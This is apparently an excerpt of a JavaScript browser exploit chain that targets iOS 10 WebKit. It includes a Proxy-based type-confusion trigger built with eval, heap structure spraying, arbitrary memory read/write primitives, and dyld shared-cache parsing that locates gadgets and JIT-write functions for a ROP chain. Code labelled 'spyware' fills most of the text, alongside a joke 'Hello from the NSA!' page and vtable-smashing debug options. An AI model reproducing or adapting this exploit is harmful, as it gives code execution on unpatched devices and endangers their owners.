    ...
    return a
      ...
      : function (a, e, h) {
          ...
          if ("function" == typeof y) {
            a = y.call(a);
            for (var k = 0; !(y = a.next()).done; )
              d.push(e.call(h, y.value, k++));
          } else
            for (y = a.length, k = 0; k < y; k++) 
              d.push(e.call(h, a[k], k));
          return d;
        };
  },
  "es6",
  ...
  function (a) {
    return a
      ...
      : function (a, e) {
          ...
          for (var k = 0; k < y && e < v; ) if (d[e++] != a[k++]) return !1;
          return k >= y;
        };
  },
  "es6",
...
function unhexlify(a) {
  ...
  for (var d = new Uint8Array(a.length / 2), e = 0; e < a.length; e += 2)
    d[e / 2] = parseInt(a.substr(e, 2), 16);
  return d;
}
function hexdump(a) {
...
function str2ab(a) {
  for (
    var d = new ArrayBuffer(2 * a.length),
      e = new Uint16Array(d),
      h = 0,
      v = a.length;
    h < v;
...
/\b10_\S+ like Mac OS X/.test(navigator.userAgent) ||
  (window.crypto.subtle || window.crypto.webkitSubtle)
    .digest({ name: "SHA-1" }, str2ab(window.location.hash))
    .then(function (a) {
      if (
        "9e04130fa02fc3c416f28ba556f0165da4d93054" != hexlify(new Uint8Array(a))
      )
        throw null;
    })
    .catch();
window.addEventListener("load", function () {
  var a = function () {
    ...
    window.setTimeout(function () {
      ...
      d.className = "center";
      d.appendChild(document.createElement("h1")).textContent =
        "Hello from the NSA!";
      d.appendChild(document.createElement("h2")).textContent =
        "Unfortunately this spyware is only compatible with iOS 10. You're not on that version, so don't try it. At all. It will break something. Seriously. Forget we said anything.";
      a.appendChild(d);
...
function Int64(a) {
  function d(a, e) {
    return function () {
      if (arguments.length != e)
        throw Error("Not enough arguments for function " + a.name);
      for (var d = 0; d < arguments.length; d++)
        arguments[d] instanceof Int64 ||
          (arguments[d] = new Int64(arguments[d]));
  ...
  this.asDouble = function () {
    if (255 == e[7] && (255 == e[6] || 254 == e[6]))
      throw new RangeError("Integer can not be represented by a double");
    return Struct.unpack(Struct.float64, e);
  };
  this.asJSValue = function () {
    if ((0 == e[7] && 0 == e[6]) || (255 == e[7] && 255 == e[6]))
...
(function () {
  function a(a, d) {
    ...
    for (var e = 0; e < a.length; ++e) {
      var f = a[e].fileoff,
        q = Add(f, a[e].size);
      if (
        (f.hi() < d.hi() || (f.hi() == d.hi() && f.lo() <= d.lo())) &&
        (q.hi() > d.hi() || (q.hi() == d.hi() && q.lo() > d.lo()))
      )
        return Add(a[e].addr, Sub(d, f));
    }
  ...
  window.spyware = function (q, f, m) {
    ...
    f.u32 = h;
    for (
      var n = f.readInt64(U), r = Sub(n, n.lo() & 4095);
      !e(f.read(r, 16), "dyld_v1   arm64");

    )
      r = Sub(r, 4096);
    var x = null,
      G = f.u32(Add(r, 20)),
      C = f.read(Add(r, f.u32(Add(r, 16))), 32 * G);
    n = [];
    for (var l = 0; l < G; ++l) {
      var g = 32 * l;
      g = {
      ...
      0 != g.fileoff.hi() ||
        0 != g.fileoff.lo() ||
        (0 == g.size.hi() && 0 == g.size.lo()) ||
        (x = g);
    }
    null == x && fail("base_seg");
    G = Sub(r, x.addr);
    for (l = 0; l < n.length; ++l) n[l].addr = Add(n[l].addr, G);
    var M = {
    ...
    if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
      ...
      M[
        "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"
      ].push("__ZN3JSC29jitWriteSeparateHeapsFunctionE"),
        (C = {
          ldrx8: [
            4181722088,
            4177527400,
    ...
    for (l = 0; l < r; ++l) {
      var Z = a(n, f.u32(Add(B, 32 * l + 24))),
        ...
        w = Add(f.readInt64(Add(B, 32 * l)), G);
      if (
        R.some(function (a) {
          return e(V, a);
        })
        ...
        for (g = 32; p < u; ++p) {
          var t = f.u32(Add(w, g));
          if (25 == t && e(f.read(Add(w, g + 8), 16), "__TEXT")) {
            t = f.u32(Add(w, g + 64));
            u = 0;
            for (p = g + 72; u < t; ++u) {
              if (e(f.read(Add(w, p), 16), "__text")) {
                ...
                if (0 == g.length) break;
                u = {};
                for (var z = 0; z < g.length; ++z) u[g[z]] = 0;
    ...
    for (l = 0; l < u.length; ++l)
      (n = u[l]), null == x[n] && fail(n), (x[n] = Add(x[n], G));
    u = Object.keys(C);
    for (l = 0; l < u.length; ++l) (n = u[l]), null == D[n] && fail(n);
    G = x.__longjmp;
    var S = D.regloader,
      N = D.dispatch,
      T = D.stackloader,
      Q = D.ldrx8,
      W = D.movx4,
      X = new Int64(f.readInt64(x._mach_task_self_).lo()),
      Y = x.__kernelrpc_mach_vm_protect_trap;
    ...
    x = x.__ZN3JSC29jitWriteSeparateHeapsFunctionE
      ? f.readInt64(x.__ZN3JSC29jitWriteSeparateHeapsFunctionE)
      : Int64.Zero;
    m.u32 = h;
    m.read = v;
    m.readInt64 = y;
    ...
    for (g = 32; l < u; ++l) {
      t = m.u32(g);
      if (25 == t && ((p = m.readInt64(g + 48)), 0 != p.hi() || 0 != p.lo())) {
        r = m.readInt64(g + 24);
        t = m.readInt64(g + 32);
        t = Add(r, t);
        if (r.hi() < w.hi() || (r.hi() == w.hi() && r.lo() <= w.lo())) w = r;
        if (t.hi() > B.hi() || (t.hi() == B.hi() && t.lo() > B.lo())) B = t;
      }
      g += m.u32(g + 4);
    }
    B = Sub(B, w);
    ...
    for (l = 0; l < u; ++l) {
      ...
      if (25 == t && ((p = m.readInt64(g + 48)), 0 != p.hi() || 0 != p.lo())) {
        ...
        n.push({ addr: Sub(H, w), size: p, fileoff: A, prots: L });
        0 != A.hi() && fail("fileoff");
        0 != p.hi() && fail("filesize");
        A = A.lo();
        p = p.lo();
    ...
    for (g = 0; g < l.length; g++) {
      param = l[g].split("=");
      if ("debug_with_vtab_smash" == param[0]) {
        if (
          !confirm(
            "You are running a debug feature, which will cause instability, if you weren't instructed to do so, please stop using it!"
          )
        )
          throw (alert("Ok pls remove the arg and reload the site"), "stop yo");
        u = parseInt(decodeURIComponent(param[1]));
        if (isNaN(u)) throw "w00t I said ints...";
        smash_int = new Int64("0x4241414141414141");
        for (t = 0; t < u; t += 8) f.writeInt64(Add(U, t), Add(smash_int, t));
        alert("Smashed vtab! Pls get the newest crash log and show it to us");
      }
      if ("dump_el_obj" == param[0]) {
        if (
          !confirm(
            "You are running a debug feature, if you weren't instructed to do so, please stop using it!"
          )
        )
          throw (alert("Ok pls remove the arg and reload the site"), "stop yo");
    ...
    var c = new Uint32Array(1048576),
      I = f.readInt64(Add(q.addrof(c), 16)),
      b = 1048576 - g,
      aa = function (a, d, e, g, f, h, k) {
        h = h || Int64.Zero;
        c[b++] = 3735879696;
        c[b++] = 3735879697;
        c[b++] = 3735879698;
    ...
    /\b10_\S+ like Mac OS X/.test(navigator.userAgent)
      ...
      : (x.lo() || x.hi() ? O(x, Sub(K, R), r, B) : fail("bi0n1c (c)"),
    ...
    O(M, new Int64(1e5));
    O(m);
    for (l = 0; 32 > l; ++l) c[b++] = 3724591326 + (l << 16);
    P = Add(I, 4 * (1048576 - g));
...
function trigger(constr, modify, res, val) {
  return eval(
    "\n    var o = [13.37]\n    var Constructor" +
      ...
      " = function(o) { " +
      constr +
      " }\n\n    var hack = false\n\n    var Wrapper = new Proxy(Constructor" +
      counter +
      ", {\n        get: function() {\n            if (hack) {\n                " +
      modify +
...
function get_mem_new(stage1) {
  ...
  var structure_spray = [];
  for (var i = 0; i < 1e3; ++i) {
    var ary = { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6, g: 268435455 };
    ary["prop" + i] = 1;
  ...
  var outer = { p0: 0, p1: f64[0], p2: manager, p3: 268435455 };
